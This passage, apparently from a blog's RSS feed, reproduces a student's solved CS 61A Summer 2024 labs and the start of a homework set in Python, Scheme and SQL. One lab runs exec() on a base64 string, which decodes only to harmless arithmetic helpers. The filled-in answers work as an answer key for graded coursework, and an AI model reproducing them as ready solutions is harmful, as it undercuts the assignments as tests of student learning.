    '''Each Server has one instance attribute called clients that is a&#13;
    dictionary from client names to client objects.&#13;
    '''&#13;
    def __init__(self):&#13;
        self.clients = {}&#13;
&#13;
    def send(self, email):&#13;
        '''Append the email to the inbox of the client it is addressed to.&#13;
            email is an instance of the Email class.&#13;
        '''&#13;
        ____.inbox.append(email)&#13;
&#13;
    def register_client(self, client):&#13;
        '''Add a client to the clients mapping (which is a &#13;
        dictionary from client names to client instances).&#13;
            client is an instance of the Client class.&#13;
        '''&#13;
        ____[____] = ____&#13;
&#13;
class Client:&#13;
    '''A client has a server, a name (str), and an inbox (list).&#13;
&#13;
    &gt;&gt;&gt; s = Server()&#13;
    &gt;&gt;&gt; a = Client(s, 'Alice')&#13;
    &gt;&gt;&gt; b = Client(s, 'Bob')&#13;
    &gt;&gt;&gt; a.compose('Hello, World!', 'Bob')&#13;
    &gt;&gt;&gt; b.inbox[0].msg&#13;
    'Hello, World!'&#13;
    &gt;&gt;&gt; a.compose('CS 61A Rocks!', 'Bob')&#13;
    &gt;&gt;&gt; len(b.inbox)&#13;
    2&#13;
    &gt;&gt;&gt; b.inbox[1].msg&#13;
    'CS 61A Rocks!'&#13;
    &gt;&gt;&gt; b.inbox[1].sender.name&#13;
    'Alice'&#13;
    '''&#13;
    def __init__(self, server, name):&#13;
        self.inbox = []&#13;
        self.server = server&#13;
        self.name = name&#13;
        server.register_client(____)&#13;
&#13;
    def compose(self, message, recipient_name):&#13;
        '''Send an email with the given message to the recipient.'''&#13;
        email = Email(message, ____, ____)&#13;
        self.server.send(email)&#13;
&#13;
&#13;
def make_change(amount, coins):&#13;
    '''Return a list of coins that sum to amount, preferring the smallest coins&#13;
    available and placing the smallest coins first in the returned list.&#13;
&#13;
    The coins argument is a dictionary with keys that are positive integer&#13;
    denominations and values that are positive integer coin counts.&#13;
&#13;
    &gt;&gt;&gt; make_change(2, {2: 1})&#13;
    [2]&#13;
    &gt;&gt;&gt; make_change(2, {1: 2, 2: 1})&#13;
    [1, 1]&#13;
    &gt;&gt;&gt; make_change(4, {1: 2, 2: 1})&#13;
    [1, 1, 2]&#13;
    &gt;&gt;&gt; make_change(4, {2: 1}) == None&#13;
    True&#13;
&#13;
    &gt;&gt;&gt; coins = {2: 2, 3: 2, 4: 3, 5: 1}&#13;
    &gt;&gt;&gt; make_change(4, coins)&#13;
    [2, 2]&#13;
    &gt;&gt;&gt; make_change(8, coins)&#13;
    [2, 2, 4]&#13;
    &gt;&gt;&gt; make_change(25, coins)&#13;
    [2, 3, 3, 4, 4, 4, 5]&#13;
    &gt;&gt;&gt; coins[8] = 1&#13;
    &gt;&gt;&gt; make_change(25, coins)&#13;
    [2, 2, 4, 4, 5, 8]&#13;
    '''&#13;
    if not coins:&#13;
        return None&#13;
    smallest = min(coins)&#13;
    rest = remove_one(coins, smallest)&#13;
    if amount &lt; smallest:&#13;
        return None&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
def remove_one(coins, coin):&#13;
    '''Remove one coin from a dictionary of coins. Return a new dictionary,&#13;
    leaving the original dictionary coins unchanged.&#13;
&#13;
    &gt;&gt;&gt; coins = {2: 5, 3: 2, 6: 1}&#13;
    &gt;&gt;&gt; remove_one(coins, 2) == {2: 4, 3: 2, 6: 1}&#13;
    True&#13;
    &gt;&gt;&gt; remove_one(coins, 6) == {2: 5, 3: 2}&#13;
    True&#13;
    &gt;&gt;&gt; coins == {2: 5, 3: 2, 6: 1} # Unchanged&#13;
    True&#13;
    '''&#13;
    copy = dict(coins)&#13;
    count = copy.pop(coin) - 1  # The coin denomination is removed&#13;
    if count:&#13;
        copy[coin] = count      # The coin denomination is added back&#13;
    return copy&#13;
&#13;
class ChangeMachine:&#13;
    '''A change machine holds a certain number of coins, initially all pennies.&#13;
    The change method adds a single coin of some denomination X and returns a&#13;
    list of coins that sums to X. The machine prefers to return the smallest&#13;
    coins available. The total value in the machine never changes, and it can&#13;
    always make change for any coin (perhaps by returning the coin passed in).&#13;
&#13;
    The coins attribute is a dictionary with keys that are positive integer&#13;
    denominations and values that are positive integer coin counts.&#13;
&#13;
    &gt;&gt;&gt; m = ChangeMachine(2)&#13;
    &gt;&gt;&gt; m.coins == {1: 2}&#13;
    True&#13;
    &gt;&gt;&gt; m.change(2)&#13;
    [1, 1]&#13;
    &gt;&gt;&gt; m.coins == {2: 1}&#13;
    True&#13;
    &gt;&gt;&gt; m.change(2)&#13;
    [2]&#13;
    &gt;&gt;&gt; m.coins == {2: 1}&#13;
    True&#13;
    &gt;&gt;&gt; m.change(3)&#13;
    [3]&#13;
    &gt;&gt;&gt; m.coins == {2: 1}&#13;
    True&#13;
&#13;
    &gt;&gt;&gt; m = ChangeMachine(10) # 10 pennies&#13;
    &gt;&gt;&gt; m.coins == {1: 10}&#13;
    True&#13;
    &gt;&gt;&gt; m.change(5) # takes a nickel &amp; returns 5 pennies&#13;
    [1, 1, 1, 1, 1]&#13;
    &gt;&gt;&gt; m.coins == {1: 5, 5: 1} # 5 pennies &amp; a nickel remain&#13;
    True&#13;
    &gt;&gt;&gt; m.change(3)&#13;
    [1, 1, 1]&#13;
    &gt;&gt;&gt; m.coins == {1: 2, 3: 1, 5: 1}&#13;
    True&#13;
    &gt;&gt;&gt; m.change(2)&#13;
    [1, 1]&#13;
    &gt;&gt;&gt; m.change(2) # not enough 1's remaining; return a 2&#13;
    [2]&#13;
    &gt;&gt;&gt; m.coins == {2: 1, 3: 1, 5: 1}&#13;
    True&#13;
    &gt;&gt;&gt; m.change(8) # cannot use the 2 to make 8, so use 3 &amp; 5&#13;
    [3, 5]&#13;
    &gt;&gt;&gt; m.coins == {2: 1, 8: 1}&#13;
    True&#13;
    &gt;&gt;&gt; m.change(1) # return the penny passed in (it's the smallest)&#13;
    [1]&#13;
    &gt;&gt;&gt; m.change(9) # return the 9 passed in (no change possible)&#13;
    [9]&#13;
    &gt;&gt;&gt; m.coins == {2: 1, 8: 1}&#13;
    True&#13;
    &gt;&gt;&gt; m.change(10)&#13;
    [2, 8]&#13;
    &gt;&gt;&gt; m.coins == {10: 1}&#13;
    True&#13;
&#13;
    &gt;&gt;&gt; m = ChangeMachine(9)&#13;
    &gt;&gt;&gt; [m.change(k) for k in [2, 2, 3]]&#13;
    [[1, 1], [1, 1], [1, 1, 1]]&#13;
    &gt;&gt;&gt; m.coins == {1: 2, 2: 2, 3: 1}&#13;
    True&#13;
    &gt;&gt;&gt; m.change(5) # Prefers [1, 1, 3] to [1, 2, 2] (more pennies)&#13;
    [1, 1, 3]&#13;
    &gt;&gt;&gt; m.change(7)&#13;
    [2, 5]&#13;
    &gt;&gt;&gt; m.coins == {2: 1, 7: 1}&#13;
    True&#13;
    '''&#13;
    def __init__(self, pennies):&#13;
        self.coins = {1: pennies}&#13;
&#13;
    def change(self, coin):&#13;
        '''Return change for coin, removing the result from self.coins.'''&#13;
        '*** YOUR CODE HERE ***'&#13;
```&#13;
&#13;
&#13;
&#13;
## lab08&#13;
&#13;
&#13;
&#13;
```python&#13;
&#13;
def cumulative_mul(t):&#13;
    '''Mutates t so that each node's label becomes the product of its own&#13;
    label and all labels in the corresponding subtree rooted at t.&#13;
&#13;
    &gt;&gt;&gt; t = Tree(1, [Tree(3, [Tree(5)]), Tree(7)])&#13;
    &gt;&gt;&gt; cumulative_mul(t)&#13;
    &gt;&gt;&gt; t&#13;
    Tree(105, [Tree(15, [Tree(5)]), Tree(7)])&#13;
    &gt;&gt;&gt; otherTree = Tree(2, [Tree(1, [Tree(3), Tree(4), Tree(5)]), Tree(6, [Tree(7)])])&#13;
    &gt;&gt;&gt; cumulative_mul(otherTree)&#13;
    &gt;&gt;&gt; otherTree&#13;
    Tree(5040, [Tree(60, [Tree(3), Tree(4), Tree(5)]), Tree(42, [Tree(7)])])&#13;
    '''&#13;
&#13;
    for b in t.branches:&#13;
        cumulative_mul(b)&#13;
        t.label *= b.label&#13;
&#13;
def delete(t, x):&#13;
    '''Remove all nodes labeled x below the root within Tree t. When a non-leaf&#13;
    node is deleted, the deleted node's children become children of its parent.&#13;
&#13;
    The root node will never be removed.&#13;
&#13;
    &gt;&gt;&gt; t = Tree(3, [Tree(2, [Tree(2), Tree(2)]), Tree(2), Tree(2, [Tree(2, [Tree(2), Tree(2)])])])&#13;
    &gt;&gt;&gt; delete(t, 2)&#13;
    &gt;&gt;&gt; t&#13;
    Tree(3)&#13;
    &gt;&gt;&gt; t = Tree(1, [Tree(2, [Tree(4, [Tree(2)]), Tree(5)]), Tree(3, [Tree(6), Tree(2)]), Tree(4)])&#13;
    &gt;&gt;&gt; delete(t, 2)&#13;
    &gt;&gt;&gt; t&#13;
    Tree(1, [Tree(4), Tree(5), Tree(3, [Tree(6)]), Tree(4)])&#13;
    &gt;&gt;&gt; t = Tree(1, [Tree(2, [Tree(4), Tree(5)]), Tree(3, [Tree(6), Tree(2)]), Tree(2, [Tree(6),  Tree(2), Tree(7), Tree(8)]), Tree(4)])&#13;
    &gt;&gt;&gt; delete(t, 2)&#13;
    &gt;&gt;&gt; t&#13;
    Tree(1, [Tree(4), Tree(5), Tree(3, [Tree(6)]), Tree(6), Tree(7), Tree(8), Tree(4)])&#13;
    '''&#13;
    new_branches = []&#13;
    for b in t.branches:&#13;
        delete(b, x)&#13;
        if b.label == x:&#13;
            new_branches.extend(b.branches)&#13;
        else:&#13;
            new_branches.append(b)&#13;
    t.branches = new_branches&#13;
&#13;
&#13;
def convert_link(link):&#13;
    '''Takes a linked list and returns a Python list with the same elements.&#13;
&#13;
    &gt;&gt;&gt; link = Link(1, Link(2, Link(3, Link(4))))&#13;
    &gt;&gt;&gt; lst = convert_link(link)&#13;
    &gt;&gt;&gt; lst&#13;
    [1, 2, 3, 4]&#13;
    &gt;&gt;&gt; convert_link(Link.empty)&#13;
    []&#13;
    '''&#13;
    if link is Link.empty:&#13;
        return []&#13;
    return [link.first] + convert_link(link.rest)&#13;
&#13;
&#13;
&#13;
def add_links(link1, link2):&#13;
    '''Adds two Links, returning a new Link&#13;
&#13;
    &gt;&gt;&gt; l1 = Link(1, Link(2))&#13;
    &gt;&gt;&gt; l2 = Link(3, Link(4, Link(5)))&#13;
    &gt;&gt;&gt; new = add_links(l1, l2)&#13;
    &gt;&gt;&gt; print(new)&#13;
    &lt;1 2 3 4 5&gt;&#13;
    &gt;&gt;&gt; new2 = add_links(l2,l1)&#13;
    &gt;&gt;&gt; print(new2)&#13;
    &lt;3 4 5 1 2&gt;&#13;
    '''&#13;
    if link1 is Link.empty:&#13;
        return link2&#13;
    return Link(link1.first, add_links(link1.rest, link2))&#13;
&#13;
&#13;
&#13;
def multiply_lnks(lst_of_lnks):&#13;
    '''&#13;
    &gt;&gt;&gt; a = Link(2, Link(3))&#13;
    &gt;&gt;&gt; b = Link(5, Link(4))&#13;
    &gt;&gt;&gt; p1 = multiply_lnks([a, b])&#13;
    &gt;&gt;&gt; p1&#13;
    Link(10, Link(12))&#13;
&#13;
    &gt;&gt;&gt; c = Link(2, Link(3, Link(5)))&#13;
    &gt;&gt;&gt; d = Link(6, Link(4, Link(2)))&#13;
    &gt;&gt;&gt; e = Link(4, Link(1, Link(0, Link(2))))&#13;
    &gt;&gt;&gt; p2 = multiply_lnks([c, d, e])&#13;
    &gt;&gt;&gt; p2&#13;
    Link(48, Link(12, Link(0)))&#13;
    '''&#13;
    product = 1&#13;
    for lst in lst_of_lnks:&#13;
        if lst is Link.empty:&#13;
            return Link.empty&#13;
        product *= lst.first&#13;
    lst_of_lnks_rests = [lst.rest for lst in lst_of_lnks]&#13;
    return Link(product, multiply_lnks(lst_of_lnks_rests))&#13;
&#13;
&#13;
class Tree:&#13;
    '''&#13;
    &gt;&gt;&gt; t = Tree(3, [Tree(2, [Tree(5)]), Tree(4)])&#13;
    &gt;&gt;&gt; t.label&#13;
    3&#13;
    &gt;&gt;&gt; t.branches[0].label&#13;
    2&#13;
    &gt;&gt;&gt; t.branches[1].is_leaf()&#13;
    True&#13;
    '''&#13;
    def __init__(self, label, branches=[]):&#13;
        for b in branches:&#13;
            assert isinstance(b, Tree)&#13;
        self.label = label&#13;
        self.branches = list(branches)&#13;
&#13;
    def is_leaf(self):&#13;
        return not self.branches&#13;
&#13;
    def __repr__(self):&#13;
        if self.branches:&#13;
            branch_str = ', ' + repr(self.branches)&#13;
        else:&#13;
            branch_str = ''&#13;
        return 'Tree({0}{1})'.format(self.label, branch_str)&#13;
&#13;
    def __str__(self):&#13;
        def print_tree(t, indent=0):&#13;
            tree_str = '  ' * indent + str(t.label) + '\n'&#13;
            for b in t.branches:&#13;
                tree_str += print_tree(b, indent + 1)&#13;
            return tree_str&#13;
        return print_tree(self).rstrip()&#13;
&#13;
&#13;
class Link:&#13;
    '''A linked list.&#13;
&#13;
    &gt;&gt;&gt; s = Link(1)&#13;
    &gt;&gt;&gt; s.first&#13;
    1&#13;
    &gt;&gt;&gt; s.rest is Link.empty&#13;
    True&#13;
    &gt;&gt;&gt; s = Link(2, Link(3, Link(4)))&#13;
    &gt;&gt;&gt; s.first = 5&#13;
    &gt;&gt;&gt; s.rest.first = 6&#13;
    &gt;&gt;&gt; s.rest.rest = Link.empty&#13;
    &gt;&gt;&gt; s                                    # Displays the contents of repr(s)&#13;
    Link(5, Link(6))&#13;
    &gt;&gt;&gt; s.rest = Link(7, Link(Link(8, Link(9))))&#13;
    &gt;&gt;&gt; s&#13;
    Link(5, Link(7, Link(Link(8, Link(9)))))&#13;
    &gt;&gt;&gt; print(s)                             # Prints str(s)&#13;
    &lt;5 7 &lt;8 9&gt;&gt;&#13;
    '''&#13;
    empty = ()&#13;
&#13;
    def __init__(self, first, rest=empty):&#13;
        assert rest is Link.empty or isinstance(rest, Link)&#13;
        self.first = first&#13;
        self.rest = rest&#13;
&#13;
    def __repr__(self):&#13;
        if self.rest is not Link.empty:&#13;
            rest_repr = ', ' + repr(self.rest)&#13;
        else:&#13;
            rest_repr = ''&#13;
        return 'Link(' + repr(self.first) + rest_repr + ')'&#13;
&#13;
    def __str__(self):&#13;
        string = '&lt;'&#13;
        while self.rest is not Link.empty:&#13;
            string += str(self.first) + ' '&#13;
            self = self.rest&#13;
        return string + str(self.first) + '&gt;'&#13;
&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## lab09&#13;
&#13;
&#13;
&#13;
```scheme&#13;
(define (over-or-under num1 num2) &#13;
      (cond ((= num1 num2) 0)&#13;
            ((&lt; num1 num2) -1)&#13;
            ((&gt; num1 num2) 1)&#13;
      )&#13;
)&#13;
(define (make-adder num) (lambda (incr) (+ num incr)))&#13;
&#13;
(define (composed f g) (lambda (x) (f (g x))))&#13;
&#13;
(define (repeat f n) (lambda (x) (if (= n 0) x ((repeat f (- n 1)) (f x)))))&#13;
&#13;
(define (max a b)&#13;
  (if (&gt; a b)&#13;
      a&#13;
      b))&#13;
&#13;
(define (min a b)&#13;
  (if (&gt; a b)&#13;
      b&#13;
      a))&#13;
&#13;
(define (gcd a b) (if (= 0 (modulo (max a b) (min a b))) (min a b) (gcd (min a b) (modulo (max a b) (min a b)))))&#13;
&#13;
(define (duplicate lst) &#13;
  (if (null? lst)&#13;
    lst&#13;
    (cons (car lst)&#13;
          (cons (car lst) &#13;
                (duplicate (cdr lst))&#13;
          )&#13;
    )&#13;
  )&#13;
)&#13;
&#13;
(expect (duplicate '(1 2 3)) (1 1 2 2 3 3))&#13;
&#13;
(expect (duplicate '(1 1)) (1 1 1 1))&#13;
&#13;
(define (deep-map fn s) &#13;
    (cond ((null? s) s) &#13;
          ((list? (car s)) (cons (deep-map fn (car s)) (deep-map fn (cdr s)))) &#13;
          (else (cons (fn (car s)) (deep-map fn (cdr s)))) &#13;
))&#13;
&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## lab10&#13;
&#13;
```python&#13;
############## You do not need to understand any of this code!&#13;
import base64&#13;
ob = 'CmRlZiBhZGRpdGlvbihleHByKToKICAgIGRpdmlkZW5kID0gZXhwci5maXJzdAogICAgZXhwciA9IGV4cHIucmVzdAogICAgd2hpbGUgZXhwciAhPSBuaWw6CiAgICAgICAgZGl2aXNvciA9IGV4cHIuZmlyc3QKICAgICAgICBkaXZpZGVuZCArPSBkaXZpc29yCiAgICAgICAgZXhwciA9IGV4cHIucmVzdAogICAgcmV0dXJuIGRpdmlkZW5kCgpkZWYgc3VidHJhY3Rpb24oZXhwcik6CiAgICBkaXZpZGVuZCA9IGV4cHIuZmlyc3QKICAgIGV4cHIgPSBleHByLnJlc3QKICAgIHdoaWxlIGV4cHIgIT0gbmlsOgogICAgICAgIGRpdmlzb3IgPSBleHByLmZpcnN0CiAgICAgICAgZGl2aWRlbmQgLT0gZGl2aXNvcgogICAgICAgIGV4cHIgPSBleHByLnJlc3QKICAgIHJldHVybiBkaXZpZGVuZAoKZGVmIG11bHRpcGxpY2F0aW9uKGV4cHIpOgogICAgZGl2aWRlbmQgPSBleHByLmZpcnN0CiAgICBleHByID0gZXhwci5yZXN0CiAgICB3aGlsZSBleHByICE9IG5pbDoKICAgICAgICBkaXZpc29yID0gZXhwci5maXJzdAogICAgICAgIGRpdmlkZW5kICo9IGRpdmlzb3IKICAgICAgICBleHByID0gZXhwci5yZXN0CiAgICByZXR1cm4gZGl2aWRlbmQKCmRlZiBkaXZpc2lvbihleHByKToKICAgIGRpdmlkZW5kID0gZXhwci5maXJzdAogICAgZXhwciA9IGV4cHIucmVzdAogICAgd2hpbGUgZXhwciAhPSBuaWw6CiAgICAgICAgZGl2aXNvciA9IGV4cHIuZmlyc3QKICAgICAgICBkaXZpZGVuZCAvPSBkaXZpc29yCiAgICAgICAgZXhwciA9IGV4cHIucmVzdAogICAgcmV0dXJuIGRpdmlkZW5kCg=='&#13;
exec(base64.b64decode(ob.encode('ascii')).decode('ascii'))&#13;
##############&#13;
&#13;
def calc_eval(exp):&#13;
    '''&#13;
    &gt;&gt;&gt; calc_eval(Pair('define', Pair('a', Pair(1, nil))))&#13;
    'a'&#13;
    &gt;&gt;&gt; calc_eval('a')&#13;
    1&#13;
    &gt;&gt;&gt; calc_eval(Pair('+', Pair(1, Pair(2, nil))))&#13;
    3&#13;
    '''&#13;
    if isinstance(exp, Pair):&#13;
        operator = exp.first # UPDATE THIS FOR Q2, e.g (+ 1 2), + is the operator&#13;
        operands = exp.rest # UPDATE THIS FOR Q2, e.g (+ 1 2), 1 and 2 are operands&#13;
        if operator == 'and': # and expressions&#13;
            return eval_and(operands)&#13;
        elif operator == 'define': # define expressions&#13;
            return eval_define(operands)&#13;
        else: # Call expressions&#13;
            return calc_apply(calc_eval(operator), operands.map(calc_eval)) # UPDATE THIS FOR Q2, what is type(operator)?&#13;
    elif exp in OPERATORS:   # Looking up procedures&#13;
        return OPERATORS[exp]&#13;
    elif isinstance(exp, int) or isinstance(exp, bool):   # Numbers and booleans&#13;
        return exp&#13;
    elif bindings.get(exp, False): # CHANGE THIS CONDITION FOR Q4 where are variables stored?&#13;
        return bindings[exp] # UPDATE THIS FOR Q4, how do you access a variable?&#13;
&#13;
def calc_apply(op, args):&#13;
    return op(args)&#13;
&#13;
def floor_div(args):&#13;
    '''&#13;
    &gt;&gt;&gt; floor_div(Pair(100, Pair(10, nil)))&#13;
    10&#13;
    &gt;&gt;&gt; floor_div(Pair(5, Pair(3, nil)))&#13;
    1&#13;
    &gt;&gt;&gt; floor_div(Pair(1, Pair(1, nil)))&#13;
    1&#13;
    &gt;&gt;&gt; floor_div(Pair(5, Pair(2, nil)))&#13;
    2&#13;
    &gt;&gt;&gt; floor_div(Pair(23, Pair(2, Pair(5, nil))))&#13;
    2&#13;
    &gt;&gt;&gt; calc_eval(Pair('//', Pair(4, Pair(2, nil))))&#13;
    2&#13;
    &gt;&gt;&gt; calc_eval(Pair('//', Pair(100, Pair(2, Pair(2, Pair(2, Pair(2, Pair(2, nil))))))))&#13;
    3&#13;
    &gt;&gt;&gt; calc_eval(Pair('//', Pair(100, Pair(Pair('+', Pair(2, Pair(3, nil))), nil))))&#13;
    20&#13;
    '''&#13;
&#13;
    result = args.first&#13;
    divisors = args.rest&#13;
    while divisors != nil:&#13;
        divisor = divisors.first&#13;
        result //= divisor&#13;
        divisors = divisors.rest&#13;
    return result&#13;
&#13;
&#13;
scheme_t = True   # Scheme's #t&#13;
scheme_f = False  # Scheme's #f&#13;
&#13;
def eval_and(expressions):&#13;
    '''&#13;
    &gt;&gt;&gt; calc_eval(Pair('and', Pair(1, nil)))&#13;
    1&#13;
    &gt;&gt;&gt; calc_eval(Pair('and', Pair(False, Pair('1', nil))))&#13;
    False&#13;
    &gt;&gt;&gt; calc_eval(Pair('and', Pair(1, Pair(Pair('//', Pair(5, Pair(2, nil))), nil))))&#13;
    2&#13;
    &gt;&gt;&gt; calc_eval(Pair('and', Pair(Pair('+', Pair(1, Pair(1, nil))), Pair(3, nil))))&#13;
    3&#13;
    &gt;&gt;&gt; calc_eval(Pair('and', Pair(Pair('-', Pair(1, Pair(0, nil))), Pair(Pair('/', Pair(5, Pair(2, nil))), nil))))&#13;
    2.5&#13;
    &gt;&gt;&gt; calc_eval(Pair('and', Pair(0, Pair(1, nil))))&#13;
    1&#13;
    &gt;&gt;&gt; calc_eval(Pair('and', nil))&#13;
    True&#13;
    '''&#13;
&#13;
    val = True&#13;
    while expressions is not nil:&#13;
        val = calc_eval(expressions.first)&#13;
        if val is scheme_f:&#13;
            return scheme_f        &#13;
        expressions = expressions.rest&#13;
        &#13;
    return val&#13;
&#13;
bindings = {}&#13;
&#13;
def eval_define(expressions):&#13;
    '''&#13;
    &gt;&gt;&gt; eval_define(Pair('a', Pair(1, nil)))&#13;
    'a'&#13;
    &gt;&gt;&gt; eval_define(Pair('b', Pair(3, nil)))&#13;
    'b'&#13;
    &gt;&gt;&gt; eval_define(Pair('c', Pair('a', nil)))&#13;
    'c'&#13;
    &gt;&gt;&gt; calc_eval('c')&#13;
    1&#13;
    &gt;&gt;&gt; calc_eval(Pair('define', Pair('d', Pair('//', nil))))&#13;
    'd'&#13;
    &gt;&gt;&gt; calc_eval(Pair('d', Pair(4, Pair(2, nil))))&#13;
    2&#13;
    '''&#13;
    symbol, value = expressions.first, calc_eval(expressions.rest.first)&#13;
    bindings[symbol] = value&#13;
    return symbol&#13;
&#13;
OPERATORS = { '//': floor_div, '+': addition, '-': subtraction, '*': multiplication, '/': division }&#13;
&#13;
class Pair:&#13;
    '''A pair has two instance attributes: first and rest. rest must be a Pair or nil&#13;
&#13;
    &gt;&gt;&gt; s = Pair(1, Pair(2, nil))&#13;
    &gt;&gt;&gt; s&#13;
    Pair(1, Pair(2, nil))&#13;
    &gt;&gt;&gt; print(s)&#13;
    (1 2)&#13;
    &gt;&gt;&gt; print(s.map(lambda x: x+4))&#13;
    (5 6)&#13;
    '''&#13;
    def __init__(self, first, rest):&#13;
        self.first = first&#13;
        self.rest = rest&#13;
&#13;
    def __repr__(self):&#13;
        return 'Pair({0}, {1})'.format(repr(self.first), repr(self.rest))&#13;
&#13;
    def __str__(self):&#13;
        s = '(' + str(self.first)&#13;
        rest = self.rest&#13;
        while isinstance(rest, Pair):&#13;
            s += ' ' + str(rest.first)&#13;
            rest = rest.rest&#13;
        if rest is not nil:&#13;
            s += ' . ' + str(rest)&#13;
        return s + ')'&#13;
&#13;
    def __len__(self):&#13;
        n, rest = 1, self.rest&#13;
        while isinstance(rest, Pair):&#13;
            n += 1&#13;
            rest = rest.rest&#13;
        if rest is not nil:&#13;
            raise TypeError('length attempted on improper list')&#13;
        return n&#13;
&#13;
    def __eq__(self, p):&#13;
        if not isinstance(p, Pair):&#13;
            return False&#13;
        return self.first == p.first and self.rest == p.rest&#13;
&#13;
    def map(self, fn):&#13;
        '''Return a Scheme list after mapping Python function FN to SELF.'''&#13;
        mapped = fn(self.first)&#13;
        if self.rest is nil or isinstance(self.rest, Pair):&#13;
            return Pair(mapped, self.rest.map(fn))&#13;
        else:&#13;
            raise TypeError('ill-formed list')&#13;
&#13;
class nil:&#13;
    '''The empty list'''&#13;
&#13;
    def __repr__(self):&#13;
        return 'nil'&#13;
&#13;
    def __str__(self):&#13;
        return '()'&#13;
&#13;
    def __len__(self):&#13;
        return 0&#13;
&#13;
    def map(self, fn):&#13;
        return self&#13;
&#13;
nil = nil() # Assignment hides the nil class; there is only one instance&#13;
```&#13;
&#13;
&#13;
&#13;
## lab11&#13;
&#13;
&#13;
&#13;
```scheme&#13;
(define (cadr lst) (car (cdr lst)))&#13;
&#13;
(define (make-kwlist1 keys values)&#13;
  (cons keys (cons values nil))&#13;
)&#13;
&#13;
(define (get-keys-kwlist1 kwlist) (car kwlist))&#13;
&#13;
(define (get-values-kwlist1 kwlist)&#13;
  (cadr kwlist)&#13;
)&#13;
&#13;
(define (make-kwlist2 keys values)&#13;
  (if (null? keys) &#13;
    nil &#13;
    (cons (cons &#13;
            (car keys) &#13;
            (cons (car values) &#13;
                  nil&#13;
            )&#13;
          ) &#13;
          (make-kwlist2 &#13;
            (cdr keys)&#13;
            (cdr values)&#13;
          )&#13;
    )&#13;
  ) &#13;
)&#13;
&#13;
(define (get-keys-kwlist2 kwlist) &#13;
  (if (null? kwlist) nil (cons (car (car kwlist)) (get-keys-kwlist2 (cdr kwlist))))&#13;
)&#13;
&#13;
(define (get-values-kwlist2 kwlist)&#13;
  (if (null? kwlist) nil (cons (cadr (car kwlist)) (get-values-kwlist2 (cdr kwlist))))&#13;
)&#13;
&#13;
(define (add-to-kwlist kwlist key value)&#13;
  (make-kwlist (append (get-keys-kwlist kwlist) (list key))  (append (get-values-kwlist kwlist) (list value)))&#13;
  &#13;
)&#13;
&#13;
(define (get-first-from-kwlist kwlist key)&#13;
 (let&#13;
      (&#13;
        (values (get-values-kwlist kwlist))&#13;
        (keys (get-keys-kwlist kwlist))&#13;
        (find (lambda (f ks vs) &#13;
                      (cond ((null? ks) nil) &#13;
                            ((equal? (car ks) key) (car vs))&#13;
                            (else (f &#13;
                                    f&#13;
                                    (cdr ks)&#13;
                                    (cdr vs)&#13;
                                  )&#13;
                            )&#13;
                      )&#13;
              )&#13;
        )&#13;
      )&#13;
      (find find keys values)&#13;
  )      &#13;
)&#13;
```&#13;
&#13;
&#13;
&#13;
```sqlite&#13;
CREATE TABLE finals AS&#13;
  SELECT 'RSF' AS hall, '61A' as course UNION&#13;
  SELECT 'Wheeler'    , '61A'           UNION&#13;
  SELECT 'Pimentel'   , '61A'           UNION&#13;
  SELECT 'Li Ka Shing', '61A'           UNION&#13;
  SELECT 'Stanley'    , '61A'           UNION&#13;
  SELECT 'RSF'        , '61B'           UNION&#13;
  SELECT 'Wheeler'    , '61B'           UNION&#13;
  SELECT 'Morgan'     , '61B'           UNION&#13;
  SELECT 'Wheeler'    , '61C'           UNION&#13;
  SELECT 'Pimentel'   , '61C'           UNION&#13;
  SELECT 'Soda 310'   , '61C'           UNION&#13;
  SELECT 'Soda 306'   , '10'            UNION&#13;
  SELECT 'RSF'        , '70';&#13;
&#13;
CREATE TABLE sizes AS&#13;
  SELECT 'RSF' AS room, 900 as seats    UNION&#13;
  SELECT 'Wheeler'    , 700             UNION&#13;
  SELECT 'Pimentel'   , 500             UNION&#13;
  SELECT 'Li Ka Shing', 300             UNION&#13;
  SELECT 'Stanley'    , 300             UNION&#13;
  SELECT 'Morgan'     , 100             UNION&#13;
  SELECT 'Soda 306'   , 80              UNION&#13;
  SELECT 'Soda 310'   , 40              UNION&#13;
  SELECT 'Soda 320'   , 30;&#13;
&#13;
CREATE TABLE sharing AS&#13;
  SELECT a.course, COUNT(DISTINCT a.hall) AS shared FROM finals as a, finals as b &#13;
    where a.course != b.course and a.hall = b.hall&#13;
  GROUP BY a.course;&#13;
&#13;
CREATE TABLE pairs AS&#13;
  SELECT a.room || ' and ' || b.room || ' together have ' || (a.seats + b.seats) || ' seats'AS rooms&#13;
  FROM sizes AS a, sizes AS b WHERE a.room &lt; b.room AND a.seats + b.seats &gt;= 1000&#13;
  ORDER BY a.seats + b.seats DESC;&#13;
&#13;
CREATE TABLE big AS&#13;
  SELECT course FROM finals, sizes WHERE hall = room GROUP BY course HAVING sum(seats) &gt;= 1000;&#13;
&#13;
CREATE TABLE remaining AS&#13;
  SELECT course, SUM(seats) - MAX(seats) AS remaining&#13;
    FROM finals, sizes WHERE hall = room GROUP BY course;&#13;
&#13;
&#13;
```&#13;
&#13;
。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cs61a-su24-labs.html</guid><pubDate>Mon, 02 Sep 2024 01:47:53 +0000</pubDate></item><item><title>cs61a-su24-hw</title><link>https://LianSeKong.github.io/lizi/post/cs61a-su24-hw.html</link><description># CS61 Summer2024  homework &#13;
&#13;
&#13;
&#13;
## hw01&#13;
&#13;
&#13;
&#13;
```python&#13;
from operator import add, sub&#13;
&#13;
def a_plus_abs_b(a, b):&#13;
    '''Return a+abs(b), but without calling abs.&#13;
&#13;
    &gt;&gt;&gt; a_plus_abs_b(2, 3)&#13;
    5&#13;
    &gt;&gt;&gt; a_plus_abs_b(2, -3)&#13;
    5&#13;
    &gt;&gt;&gt; a_plus_abs_b(-1, 4)&#13;
    3&#13;
    &gt;&gt;&gt; a_plus_abs_b(-1, -4)&#13;
    3&#13;
    '''&#13;
    if b &lt; 0:&#13;
        f = sub&#13;
    else:&#13;
        f = add&#13;
    return f(a, b)&#13;
&#13;
&#13;
def two_of_three(i, j, k):&#13;
    '''Return m*m + n*n, where m and n are the two smallest members of the&#13;
    positive numbers i, j, and k.&#13;
&#13;
    &gt;&gt;&gt; two_of_three(1, 2, 3)&#13;
    5&#13;
    &gt;&gt;&gt; two_of_three(5, 3, 1)&#13;
    10&#13;
    &gt;&gt;&gt; two_of_three(10, 2, 8)&#13;
    68&#13;
